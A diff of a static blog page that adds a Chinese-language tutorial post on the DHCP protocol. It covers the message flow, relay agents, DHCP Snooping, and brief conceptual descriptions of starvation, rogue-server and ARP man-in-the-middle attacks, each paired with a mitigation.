+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-08 12:51:56" itemprop="dateModified" datetime="2023-03-08T12:51:56+08:00">2023-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h1><hr>
+<h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><blockquote>
+<p>减少错误</p>
+</blockquote>
+<p>通过配置DHCP，把手工配置IP地址所导致的错误减少到最低程度，例如已分配的IP地址再次分配给另一设备所造成的地址冲突等将大大减少</p>
+<blockquote>
+<p>减少网络管理</p>
+</blockquote>
+<p>1、TCP&#x2F;IP配置是集中化和自动完成的，不需要网络管理员手工配置。网络管理员能集中定义全局和特定子网的TCP&#x2F;IP配置信息</p>
+<p>2、使用DHCP选项可以自动给客户机分配全部范围的附加TCP&#x2F;IP配置值。客户机配置的地址变化必须经常更新，比如远程访问客户机经常到处移动，这样便于它在新的地点重新启动时，高效而又自动地进行配置</p>
+<p>3、同时大部分路由器能转发DHCP配置请求，这就减少了在每个子网设置DHCP服务器的必要，除非有其它原因要这样做</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）</p>
+<p>通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率</p>
+<blockquote>
+<p>端口</p>
+</blockquote>
+<p>DHCP是Bootstrap协议的一种扩展,基于UDP协议,客户端的端口号是68,服务端的端口号是67</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105152732726.png" alt="image-20220105152732726"></p>
+<blockquote>
+<p>协议特性</p>
+</blockquote>
+<p>1、保证任何IP地址在同一时刻只能由一台DHCP客户机所使用</p>
+<p>2、DHCP应当可以给用户分配永久固定的IP地址</p>
+<p>3、DHCP应当可以同用其他方法获得IP地址的主机共存(如手工配置IP地址的主机)</p>
+<p>4、DHCP服务器应当向现有的DHCP客户端提供服务</p>
+<blockquote>
+<p>DHCP数据包结构</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105152939855.png" alt="image-20220105152939855"></p>
+<blockquote>
+<p>常用的option</p>
+</blockquote>
+<p>1 netmask<br>3 router<br>6 DNS<br>12 host name<br>51 ip address lease time<br>53 message type （dhcp报文8种类型，下一页介绍）<br>54 server identification<br>55 parameter request list （需要服务器给你提供哪些东西：ip地址，域名，网关）<br>61 client identification<br>82 relay agent<br>255 end</p>
+<blockquote>
+<p>DHCP报文8种类型</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153210387.png" alt="image-20220105153210387"></p>
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>DHCP 是一种动态的向Internet终端提供配置参数的协议。在终端提出申请之后，</p>
+<p>DHCP服务端可以向终端提供IP地址、网关、DNS服务器地址等参数</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153251866.png" alt="image-20220105153251866"></p>
+<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>1、客户机在本网段内广播DHCPDISCOVER报文已发现网络中的DHCP服务器</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153411487.png" alt="image-20220105153411487"></p>
+<p>2、服务器向客户机回应请求,并给出一个可用的IP地址。但在给出此地之前，应当用ICMP ECHO REQUEST报文进行检查，检查是否有其他机器配置此IP地址</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153437389.png" alt="image-20220105153437389"></p>
+<p>3、如果收到多个DHCPOFFER报文,DHCP客户机会根据报文的内容从其中选择一个给与响应。如果客户机之前曾经获得过一个IP地址，它会将此地址写在DHCPREQUEST报文的OPTIONS域的“REQUESTD IP ADDRESS”中发给服务器</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153505641.png" alt="image-20220105153505641"></p>
+<p>4、当收到DHCPREQUEST报文后,服务器将客户机的网络的(网络地址,硬件地址)同分配的IP地址绑定,在将IP地址发送给客户机</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153531714.png" alt="image-20220105153531714"></p>
+<p>5、当收到DHCPREQUEST报文后,如果发现其申请的地址无法被分配,则用DHCPNAK报文回应</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153556724.png" alt="image-20220105153556724"></p>
+<p>6、客户机收到DHCPACK报文后,再对所有的参数进行一次最后的检查,如果发现由地址冲突存在,则使用DHCPDECLINE报文回复服务器</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153616574.png" alt="image-20220105153616574"></p>
+<p>7、如果客户机放弃现在使用的IP地址,则她使用DHCPRELEASE报文通知服务器,服务器将此地址回收以备下次使用</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153632806.png" alt="image-20220105153632806"></p>
+<h2 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h2><p>考虑到成本,无需每个子网都配备一台DHCP服务器,所以DHCP协议应当可以通过路由器或者BOOTP代理透传（DHCP中继）</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153744995.png" alt="image-20220105153744995"></p>
+<p>由于DHCP请求报文采用广播方式发送报文，因此当DHCP客户端和DHCP服务器处于不同子网时，必须要通过DHCP中继进行通信，最终获取到IP地址</p>
+<p>多个网络上的DHCP客户端可以使用同一个DHCP服务器，既节省了成本，又便于进行集中管理</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105153815876.png" alt="image-20220105153815876"></p>
+<h2 id="DHCP-Snooping"><a href="#DHCP-Snooping" class="headerlink" title="DHCP Snooping"></a>DHCP Snooping</h2><blockquote>
+<p>概述</p>
+</blockquote>
+<p>DHCP Snooping是 DHCP 的一种安全特性，主要应用在 交换机 上，作用是屏蔽接入网络中的非法的 DHCP 服务器。即开启 DHCP Snooping 功能后，网络中的客户端只有从管理员指定的 DHCP 服务器获取 IP 地址</p>
+<blockquote>
+<p>攻击方式</p>
+</blockquote>
+<p>DHCP在设计上未从分考虑安全因素，从而留下了许多安全漏洞，使得DHCP很容易受到攻击。实际网络中，针对DHCP的攻击行为主要有以下三种：</p>
+<ul>
+<li>DHCP饿死攻击</li>
+<li>仿冒DHCP Server攻击</li>
+<li>DHCP中间人攻击</li>
+</ul>
+<h2 id="DHCP饿死攻击"><a href="#DHCP饿死攻击" class="headerlink" title="DHCP饿死攻击"></a>DHCP饿死攻击</h2><blockquote>
+<p>攻击原理</p>
+</blockquote>
+<p>攻击者持续大量的向DHCP Server申请地址，直到耗尽DHCP Server地址池中的IP地址，导致DHCP Server不能给正常的用户进行分配</p>
+<blockquote>
+<p>解决方法</p>
+</blockquote>
+<p>通过校验CHADDR与MAC值</p>
+<blockquote>
+<p>示例图</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105154109659.png" alt="image-20220105154109659"></p>
+<h2 id="仿冒DHCP-Server攻击"><a href="#仿冒DHCP-Server攻击" class="headerlink" title="仿冒DHCP Server攻击"></a>仿冒DHCP Server攻击</h2><blockquote>
+<p>攻击原理</p>
+</blockquote>
+<p>攻击者仿冒DHCP Server，向客户端分配错误的IP地址及提供错误的网关地址等，导致客户端无法正常访问网络</p>
+<blockquote>
+<p>解决方法</p>
+</blockquote>
+<p>通过配置trust与untrust口区分转发</p>
+<blockquote>
+<p>示例图</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105154223600.png" alt="image-20220105154223600"></p>
+<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><blockquote>
+<p>攻击原理</p>
+</blockquote>
+<p>攻击者利用ARP机制，让PC-A学习到IP-S与MAC-B的映射关系，又让Server学习到IP-A与MAC-B的映射关系。如此一来，PC-A与Server之间交付的IP报文都会经过攻击者中转</p>
+<blockquote>
+<p>解决方法</p>
+</blockquote>
+<p>开启ARP检测</p>
+<blockquote>
+<p>示例图</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105154317251.png" alt="image-20220105154317251"></p>
 
       
     </div>
@@ -1705,7 +1738,7 @@
 
 
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
